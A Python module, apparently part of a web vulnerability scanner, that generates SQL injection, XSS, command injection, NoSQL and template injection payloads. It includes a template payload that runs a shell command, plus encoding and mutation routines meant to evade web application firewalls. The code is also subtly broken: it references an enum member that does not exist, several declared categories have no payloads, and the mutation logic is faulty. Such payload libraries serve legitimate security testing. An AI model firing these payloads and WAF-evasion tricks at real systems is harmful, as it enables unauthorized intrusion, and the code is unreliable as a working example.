"""Intelligent context-aware payload generation engine."""

import logging
import random
from typing import List, Dict, Any, Optional, Callable
from enum import Enum
from urllib.parse import quote, quote_plus, unquote
import html
import base64


logger = logging.getLogger(__name__)


class PayloadCategory(Enum):
    """Payload categories for different vulnerability types."""
    
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    LDAP_INJECTION = "ldap_injection"
    SSTI = "ssti"
    XXE = "xxe"
    XPATH = "xpath"
    NOSQL = "nosql"


class EncodingStrategy(Enum):
    """Different encoding strategies for WAF evasion."""
    
    PLAIN = "plain"
    URL_ENCODE = "url_encode"
    DOUBLE_URL_ENCODE = "double_url_encode"
    HTML_ENCODE = "html_encode"
    BASE64 = "base64"
    UNICODE = "unicode"
    PHP_FILTER = "php_filter"
    CASE_VARIATION = "case_variation"


class PayloadContext:
    """Context information for intelligent payload selection."""
    
    def __init__(
        self,
        injection_point: str = "parameter",
        parameter_name: Optional[str] = None,
        framework: Optional[str] = None,
        database_type: Optional[str] = None,
        detected_waf: Optional[str] = None,
    ):
        """
        Initialize payload context.
        
        Parameters
        ----------
        injection_point : str
            Where payload is injected (parameter, cookie, header, path, etc).
        parameter_name : str
            Name of parameter being tested.
        framework : str
            Detected web framework.
        database_type : str
            Detected database backend.
        detected_waf : str
            Detected WAF product.
        """
        self.injection_point = injection_point
        self.parameter_name = parameter_name
        self.framework = framework
        self.database_type = database_type or "mysql"  # Default assumption
        self.detected_waf = detected_waf
        
    def is_json_context(self) -> bool:
        """Check if payload should be JSON formatted."""
        return self.injection_point in ["json", "api"]
        
    def is_attribute_context(self) -> bool:
        """Check if payload is in HTML attribute."""
        return self.injection_point == "attribute"


class PayloadGenerator:
    """
    Advanced payload generator with context awareness.
    
    Generates contextually appropriate payloads for vulnerability testing.
    """
    
    # SQL Injection payloads for different techniques
    SQL_ERROR_BASED = [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "1' UNION SELECT NULL,NULL,NULL--",
        "' AND 1=CAST((SELECT 1) AS INT)--",
        "' AND 1=CAST(0x01 AS INT)--",
    ]
    
    SQL_BOOLEAN_BASED = [
        "' AND '1'='1",
        "' AND '1'='2",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "admin' AND '1'='1",
    ]
    
    SQL_TIME_BASED = [
        "' AND SLEEP(5)--",
        "' AND BENCHMARK(5000000,MD5('test'))--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' OR SLEEP(5)--",
    ]
    
    # XSS payloads with multiple escape contexts
    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        '"><script>alert(1)</script>',
        "<img src=x onerror=alert(1)>",
        '<svg/onload=alert(1)>',
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<input onfocus=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        '<img src=x alt="" title="" onclick=alert(1)>',
        '"onmouseover="alert(1)',
        "';alert(1);//",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s values=1;2 />",
        '<iframe srcdoc="<script>alert(1)</script>">',
    ]
    
    # Command injection payloads
    COMMAND_INJECTION = [
        "; ls -la",
        "| whoami",
        "& ipconfig",
        "`id`",
        "$(whoami)",
        "||calc.exe",
        "&& dir",
    ]
    
    # NoSQL injection payloads
    NOSQL_PAYLOADS = [
        "' OR '1'='1",
        "' || '1'=='1",
        "{$ne: null}",
        "{$ne: ''}",
        "{$gt: ''}",
        "{$regex: '.*'}",
        "{$where: '1==1'}",
    ]
    
    # SSTI payloads for various templates
    SSTI_PAYLOADS = [
        "${{7*7}}",
        "#{7*7}",
        "${7*7}",
        "{{ 7*7 }}",
        "<%= 7*7 %>",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    ]
    
    def __init__(self):
        """Initialize payload generator."""
        self.generated_count = 0
        self.encoding_strategies = list(EncodingStrategy)
        
    def generate(
        self,
        category: PayloadCategory,
        context: PayloadContext,
        count: int = 1,
        encoding: Optional[EncodingStrategy] = None,
    ) -> List[str]:
        """
        Generate payloads for vulnerability testing.
        
        Parameters
        ----------
        category : PayloadCategory
            Type of vulnerability to test for.
        context : PayloadContext
            Context information about injection point.
        count : int
            Number of payloads to generate.
        encoding : EncodingStrategy
            Specific encoding to apply.
            
        Returns
        -------
        List[str]
            List of generated payloads.
        """
        # Select base payloads
        base_payloads = self._get_base_payloads(category, context)
        
        # If specific encoding requested, use it
        if encoding:
            return [self._encode_payload(p, encoding) for p in base_payloads[:count]]
            
        # Otherwise, generate diverse payloads with various encodings
        payloads = []
        strategies = random.sample(self.encoding_strategies, min(count, len(self.encoding_strategies)))
        
        for i, strategy in enumerate(strategies):
            if i < len(base_payloads):
                payloads.append(self._encode_payload(base_payloads[i], strategy))
                
        self.generated_count += len(payloads)
        return payloads
        
    def generate_adaptive(
        self,
        category: PayloadCategory,
        context: PayloadContext,
        previous_responses: List[str] = None,
        detected_blocks: List[str] = None,
    ) -> List[str]:
        """
        Generate payloads adaptively based on previous responses.
        
        Mutates payloads to evade WAF detection based on blocked patterns.
        """
        base_payloads = self._get_base_payloads(category, context)
        
        if not detected_blocks or not previous_responses:
            return self.generate(category, context)
            
        # Mutate payloads to avoid detected blocks
        mutated = []
        for payload in base_payloads:
            for block in detected_blocks:
                if block.lower() in payload.lower():
                    # Apply mutation
                    payload = self._mutate_payload(payload, block)
                    
            mutated.append(payload)
            
        return mutated[:5]
        
    def _get_base_payloads(
        self,
        category: PayloadCategory,
        context: PayloadContext,
    ) -> List[str]:
        """Get base payloads for category."""
        if category == PayloadCategory.SQL_INJECTION:
            if context.database_type.lower() == "mssql":
                return self.SQL_TIME_BASED
            elif context.database_type.lower() == "postgres":
                return self.SQL_TIME_BASED
            else:
                return self.SQL_ERROR_BASED + self.SQL_BOOLEAN_BASED
                
        elif category == PayloadCategory.XSS:
            if context.is_attribute_context():
                return ['onmouseover="alert(1)"', 'onclick="alert(1)"']
            elif context.is_json_context():
                return ['<script>alert(1)</script>', '"}catch(e){alert(1)}//']
            else:
                return self.XSS_PAYLOADS
                
        elif category == PayloadCategory.COMMAND_INJECTION:
            return self.COMMAND_INJECTION
            
        elif category == PayloadCategory.NOSQL_INJECTION:
            return self.NOSQL_PAYLOADS
            
        elif category == PayloadCategory.SSTI:
            if context.framework == "jinja2":
                return ["{{ 7*7 }}", "{{config.__class__}}"]
            elif context.framework == "erb":
                return ["<%= 7*7 %>", "<%= system('id') %>"]
            else:
                return self.SSTI_PAYLOADS
                
        return []
        
    def _encode_payload(
        self,
        payload: str,
        strategy: EncodingStrategy,
    ) -> str:
        """Apply encoding strategy to payload."""
        if strategy == EncodingStrategy.PLAIN:
            return payload
        elif strategy == EncodingStrategy.URL_ENCODE:
            return quote(payload, safe='')
        elif strategy == EncodingStrategy.DOUBLE_URL_ENCODE:
            return quote(quote(payload, safe=''), safe='')
        elif strategy == EncodingStrategy.HTML_ENCODE:
            return html.escape(payload)
        elif strategy == EncodingStrategy.BASE64:
            return base64.b64encode(payload.encode()).decode()
        elif strategy == EncodingStrategy.UNICODE:
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif strategy == EncodingStrategy.PHP_FILTER:
            return f"php://filter/|{quote(payload, safe='')}"
        elif strategy == EncodingStrategy.CASE_VARIATION:
            # Alternate case for commands (less effective but sometimes bypasses filters)
            return ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload))
        else:
            return payload
            
    def _mutate_payload(self, payload: str, blocked_pattern: str) -> str:
        """Mutate payload to evade WAF."""
        # Simple mutations:
        # 1. Case variation
        mutated = ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload))
        
        # 2. Comment/space injection
        if payload.startswith("'"):
            mutated = "'/**/OR/**/'" if "OR" in payload else payload
            
        return mutated
